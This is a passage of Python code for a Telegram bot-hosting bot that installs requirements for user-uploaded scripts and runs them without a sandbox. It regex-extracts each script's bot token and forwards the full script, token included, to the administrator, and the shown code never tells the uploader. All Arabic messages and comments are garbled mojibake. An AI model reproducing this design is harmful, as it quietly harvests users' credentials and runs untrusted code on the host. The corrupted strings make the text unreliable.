                    bot.send_message(ADMIN_ID, f"âŒ ØªÙ… Ø±ÙØ¶ Ø±ÙØ¹ Ø§Ù„Ù…Ù„Ù {file_name} Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}.")
                    bot.send_message(user_id, f"âŒ ØªÙ… Ø±ÙØ¶ Ø·Ù„Ø¨ Ø±ÙØ¹ Ù…Ù„ÙÙƒ {file_name} Ù…Ù† Ù‚Ø¨Ù„ Ø§Ù„Ù…Ø´Ø±Ù.")
                except Exception as e:
                    logger.error(f"ÙØ´Ù„ ÙÙŠ Ø­Ø°Ù Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…Ø±ÙÙˆØ¶: {e}")
            
            del pending_approvals[file_key]
        else:
            bot.send_message(ADMIN_ID, "âš ï¸ Ø§Ù†ØªÙ‡Øª ØµÙ„Ø§Ø­ÙŠØ© Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø£Ùˆ ØªÙ… Ù…Ø¹Ø§Ù„Ø¬ØªÙ‡ Ù…Ø³Ø¨Ù‚Ø§Ù‹.")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")

def scan_file(file_content, file_name):
    """Ø¯Ø§Ù„Ø© ÙØ­Øµ Ø§Ù„Ù…Ù„Ù Ø¹Ø¨Ø± API"""
    try:
        files = {'file': (file_name, file_content)}
        response = requests.post(SCAN_API_URL, files=files, timeout=15)
        response.raise_for_status()
        
        result = response.json()
        logger.info(f"Ù†ØªÙŠØ¬Ø© ÙØ­Øµ API Ù„Ù„Ù…Ù„Ù {file_name}: {result}")
        
        
        return result.get("status", "").lower() == "Ø¢Ù…Ù†"
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Ø®Ø·Ø£ ÙÙŠ Ø§ØªØµØ§Ù„ API Ø§Ù„ÙØ­Øµ: {e}")
        
        return False
    except Exception as e:
        logger.error(f"Ø®Ø·Ø£ ØºÙŠØ± Ù…ØªÙˆÙ‚Ø¹ ÙÙŠ ÙØ­Øµ Ø§Ù„Ù…Ù„Ù: {e}")
        return False

def run_script(script_path, chat_id, folder_path, file_name, original_message):
    try:
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "ğŸ”„ Ø¬Ø§Ø±Ù ØªØ«Ø¨ÙŠØª Ø§Ù„Ù…ØªØ·Ù„Ø¨Ø§Øª...")
            subprocess.check_call(['pip', 'install', '-r', requirements_path])

        bot.send_message(chat_id, f"ğŸš€ Ø¬Ø§Ø±Ù ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª {file_name}...")
        
        
        env = os.environ.copy()
        env["PYTHONPATH"] = os.path.dirname(script_path)
        
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
        bot_scripts[chat_id] = {'process': process, 'folder_path': folder_path}

        token = extract_token_from_script(script_path)
        if token:
            try:
                bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
                if bot_info.get('ok'):
                    bot_username = bot_info['result']['username']

                    user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
                    caption = f"ğŸ“¤ Ù‚Ø§Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_info} Ø¨Ø±ÙØ¹ Ù…Ù„Ù Ø¨ÙˆØª Ø¬Ø¯ÙŠØ¯. Ù…Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª: @{bot_username}"
                    bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=caption)

                    markup = types.InlineKeyboardMarkup()
                    stop_button = types.InlineKeyboardButton(f"ğŸ”´ Ø¥ÙŠÙ‚Ø§Ù {file_name}", callback_data=f'stop_{chat_id}_{file_name}')
                    delete_button = types.InlineKeyboardButton(f"ğŸ—‘ï¸ Ø­Ø°Ù {file_name}", callback_data=f'delete_{chat_id}_{file_name}')
                    markup.add(stop_button, delete_button)
                    bot.send_message(chat_id, f"Ø§Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø£Ø¯Ù†Ø§Ù‡ Ù„Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø¨ÙˆØª ğŸ‘‡", reply_markup=markup)
                else:
                    bot.send_message(chat_id, f"âœ… ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­! ÙˆÙ„ÙƒÙ† Ù„Ù… Ø£ØªÙ…ÙƒÙ† Ù…Ù† Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù…Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª.")
            except Exception as e:
                logger.error(f"ÙØ´Ù„ ÙÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù…Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª: {e}")
                bot.send_message(chat_id, f"âœ… ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­! ÙˆÙ„ÙƒÙ† Ù„Ù… Ø£ØªÙ…ÙƒÙ† Ù…Ù† Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù…Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª.")
        else:
            bot.send_message(chat_id, f"âœ… ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­! ÙˆÙ„ÙƒÙ† Ù„Ù… Ø£ØªÙ…ÙƒÙ† Ù…Ù† Ø¬Ù„Ø¨ Ù…Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª.")
            user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=f"ğŸ“¤ Ù‚Ø§Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_info} Ø¨Ø±ÙØ¹ Ù…Ù„Ù Ø¨ÙˆØª Ø¬Ø¯ÙŠØ¯ØŒ ÙˆÙ„ÙƒÙ† Ù„Ù… Ø£ØªÙ…ÙƒÙ† Ù…Ù† Ø¬Ù„Ø¨ Ù…Ø¹Ø±Ù Ø§Ù„Ø¨ÙˆØª.")

    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª: {e}")
        bot.send_message(chat_id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª: {e}")


def extract_token_from_script(script_path):
    try:
        with open(script_path, 'r', encoding='utf-8', errors='ignore') as script_file:
            file_content = script_file.read()

            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]+)['\"]", file_content)
            if token_match:
                return token_match.group(1)
            else:
                logger.warning(f"Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ ØªÙˆÙƒÙ† ÙÙŠ {script_path}")
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ† Ù…Ù† {script_path}: {e}")
    return None


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    
    
    if 'stop_' in call.data:
        file_name = call.data.split('_')[-1]
        stop_running_bot(chat_id)
    elif 'delete_' in call.data:
        file_name = call.data.split('_')[-1]
        delete_uploaded_file(chat_id)


def stop_running_bot(chat_id):
    if chat_id in bot_scripts and bot_scripts[chat_id].get('process'):
        kill_process_tree(bot_scripts[chat_id]['process'])
        bot.send_message(chat_id, "ğŸ”´ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª.")
    else:
        bot.send_message(chat_id, "âš ï¸ Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆØª ÙŠØ¹Ù…Ù„ Ø­Ø§Ù„ÙŠØ§Ù‹.")


def delete_uploaded_file(chat_id):
    if chat_id in bot_scripts and bot_scripts[chat_id].get('folder_path') and os.path.exists(bot_scripts[chat_id]['folder_path']):
        shutil.rmtree(bot_scripts[chat_id]['folder_path'])
        bot.send_message(chat_id, f"ğŸ—‘ï¸ ØªÙ… Ø­Ø°Ù Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…ØªØ¹Ù„Ù‚Ø© Ø¨Ø§Ù„Ø¨ÙˆØª.")
    else:
        bot.send_message(chat_id, "âš ï¸ Ø§Ù„Ù…Ù„ÙØ§Øª ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø©.")


def kill_process_tree(process):
    try:
        parent = psutil.Process(process.pid)
        children = parent.children(recursive=True)
        for child in children:
            child.kill()
        parent.kill()
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ Ù‚ØªÙ„ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©: {e}")


@bot.message_handler(commands=['delete_user_file'])
def delete_user_file(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            file_name = message.text.split()[2]
            
            if user_id in user_files and file_name in user_files[user_id]:
                file_path = os.path.join(uploaded_files_dir, file_name)
                if os.path.exists(file_path):
                    os.remove(file_path)
                    user_files[user_id].remove(file_name)
                    remove_user_file_db(user_id, file_name)
                    bot.send_message(message.chat.id, f"âœ… ØªÙ… Ø­Ø°Ù Ø§Ù„Ù…Ù„Ù {file_name} Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}.")
                else:
                    bot.send_message(message.chat.id, f"âš ï¸ Ø§Ù„Ù…Ù„Ù {file_name} ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯.")
            else:
                bot.send_message(message.chat.id, f"âš ï¸ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id} Ù„Ù… ÙŠØ±ÙØ¹ Ø§Ù„Ù…Ù„Ù {file_name}.")
        except Exception as e:
            logger.error(f"ÙØ´Ù„ ÙÙŠ Ø­Ø°Ù Ù…Ù„Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
            bot.send_message(message.chat.id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(commands=['stop_user_bot'])
def stop_user_bot(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            file_name = message.text.split()[2]
            
            if user_id in user_files and file_name in user_files[user_id]:
                for chat_id, script_info in bot_scripts.items():
                    if script_info.get('folder_path', '').endswith(file_name.split('.')[0]):
                        kill_process_tree(script_info['process'])
                        bot.send_message(chat_id, f"ğŸ”´ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª {file_name}.")
                        bot.send_message(message.chat.id, f"âœ… ØªÙ… Ø¥ÙŠÙ‚Ø§Ù ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª {file_name} Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}.")
                        break
                else:
                    bot.send_message(message.chat.id, f"âš ï¸ Ø§Ù„Ø¨ÙˆØª {file_name} ØºÙŠØ± Ù‚ÙŠØ¯ Ø§Ù„ØªØ´ØºÙŠÙ„.")
            else:
                bot.send_message(message.chat.id, f"âš ï¸ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id} Ù„Ù… ÙŠØ±ÙØ¹ Ø§Ù„Ù…Ù„Ù {file_name}.")
        except Exception as e:
            logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¥ÙŠÙ‚Ø§Ù Ø¨ÙˆØª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
            bot.send_
